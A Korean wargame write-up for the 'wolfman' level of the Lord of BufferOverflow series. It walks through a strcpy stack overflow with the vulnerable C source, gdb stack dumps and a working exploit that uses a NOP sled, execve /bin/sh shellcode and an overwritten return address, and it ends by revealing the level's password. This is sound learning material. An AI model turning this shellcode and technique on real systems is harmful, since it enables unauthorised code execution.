============================================================================================================
[redhat-lob] (5) wolfman
============================================================================================================



.. graphviz::

    digraph foo {
        a -> b -> c -> d -> a;

        a [shape=box, label="dummy * 19 + shellcode + (argv[1] address+4*i)"];
        b [shape=box, color=lightblue, label="strcpy"];
        c [shape=box, label="Buffer Overflow"];
        d [shape=box, label="(argv[1] address+4*i)"];
    }


|

Source Code
============================================================================================================

.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>

    extern char **environ;

    main(int argc, char *argv[])
    {
        char buffer[40];
        int i;

        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
            memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
            printf("stack is still your friend.\n");
            exit(0);
        }
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
    }

|

Vulnerabliity Vector
============================================================================================================

main 함수의 ret를 덮어씌워 오버플로우를 발생시킨다.

.. code-block:: console

    ==============================
    LOW     
    ------------------------------
    local variables of main
    saved registers of main
    return address of main <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers
    NULL that ends argv[]
    environment pointers
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)    
    ==============================

|

Buffer Overflow
============================================================================================================

Overflow condition 

- environ을 초기화하여 환경 변수 사용를 통한 쉘코드 삽입이 불가능하다.
- argv[1]의 47번째 문자열이 "\\xbf"이어야 함

.. code-block:: console

    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
    $ bash2
    $ ./wolfman `python -c 'print "a"*47'`

    stack is still your friend.

    $ ./wolfman `python -c 'print "a"*47+"\xbf"'`

    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒
    Segmentation fault


|

exploit
============================================================================================================

argv[1]이 저장되는 주소 확인
------------------------------------------------------------------------------------------------------------

앞의 조건에 argv[1][47]값이 "\\xbf"인지 확인하기 때문에, gdb를 이용하여 argv[1]이 저장되는 주소(buffer)를 찾는다.

.. code-block:: console

    (gdb) b *main
    Breakpoint 1 at 0x8048500

    (gdb) r `python -c 'print "a"*47+"\xbf"'`
    Starting program: /home/orc/wolfman1 `python -c 'print "a"*47+"\xbf"'`
    /bin/bash: /home/goblin/.bashrc: Permission denied

    Breakpoint 1, 0x8048500 in main ()

    (gdb) stepi
    0x8048501 in main ()

    (gdb) i reg $esp
    esp            0xbffffae8       -1073743128

    (gdb) i reg $ebp
    ebp            0xbffffb08       -1073743096

    (gdb) x/100x $esp

    ==========================================================================
    0xbffffae8:     0xbffffb08      0x400309cb      0x00000002      0xbffffb34
    0xbffffaf8:     0xbffffb40      0x40013868      0x00000002      0x08048450
    0xbffffb08:     0x00000000      0x08048471      0x08048500      0x00000002
    0xbffffb18:     0xbffffb34      0x08048390      0x0804861c      0x4000ae60
    0xbffffb28:     0xbffffb2c      0x40013e90      0x00000002      0xbffffc2e
    0xbffffb38:     0xbffffc43      0x00000000      0xbffffc74      0xbffffc96
    0xbffffb48:     0xbffffca0      0xbffffcae      0xbffffccd      0xbffffcd9
    0xbffffb58:     0xbffffcf2      0xbffffd0e      0xbffffd2d      0xbffffd38
    0xbffffb68:     0xbffffd46      0xbffffd88      0xbffffd97      0xbffffdac
    0xbffffb78:     0xbffffdbc      0xbffffdc5      0xbffffde3      0xbffffdee
    0xbffffb88:     0xbffffdff      0xbffffe0d      0xbffffe1c      0xbffffe24
    0xbffffb98:     0x00000000      0x00000003      0x08048034      0x00000004
    0xbffffba8:     0x00000020      0x00000005      0x00000006      0x00000006
    0xbffffbb8:     0x00001000      0x00000007      0x40000000      0x00000008
    0xbffffbc8:     0x00000000      0x00000009      0x08048450      0x0000000b
    0xbffffbd8:     0x000001f8      0x0000000c      0x000001f8      0x0000000d
    0xbffffbe8:     0x000001f8      0x0000000e      0x000001f8      0x00000010
    0xbffffbf8:     0x0fabfbff      0x0000000f      0xbffffc29      0x00000000
    0xbffffc08:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbffffc18:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbffffc28:     0x38366900      0x682f0036      0x2f656d6f      0x2f63726f
    0xbffffc38:     0x6f772f2e      0x616d666c      0x6100336e      0x61616161
                                                      ^               ^
    0xbffffc48:     0x61616161      0x61616161      0x61616161      0x61616161
                      ^               ^               ^ argv[1] = 0xbffffc53
    0xbffffc58:     0x61616161      0x61616161      0x61616161      0x61616161
    0xbffffc68:     0x61616161      0x61616161      0x00bf6161      0x5353454c
    ==========================================================================

|

argv[1] pointers 쉘코드 실행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    ==============================
    LOW     
    ------------------------------
    local variables of main
    saved registers of main
    return address of main <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers ->> shellcode
    NULL that ends argv[]
    environment pointers
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)    
    ==============================

|

오버플로우시 RET를 argv[1] 주소로 덮어씌워 해당 쉘코드가 실행되도록 한다. argv[1] 최초 주소값을 확인하여 4바이트씩 증가하면서 주소를 변경하면서 공격을 진행하면 성공시킬 수 있다.


.. code-block:: console

    $ ./wolfman `python -c 'print "\x90"*19 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x43\xfc\xff\xbf"'`
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                           ̀L▒▒▒
    Segmentation fault

    $ ./wolfman `python -c 'print "\x90"*19 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x53\xfc\xff\xbf"'`
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                           ̀S▒▒▒

    bash$ whoami
    wolfman
    bash$ my-pass
    euid = 505
    love eyuna

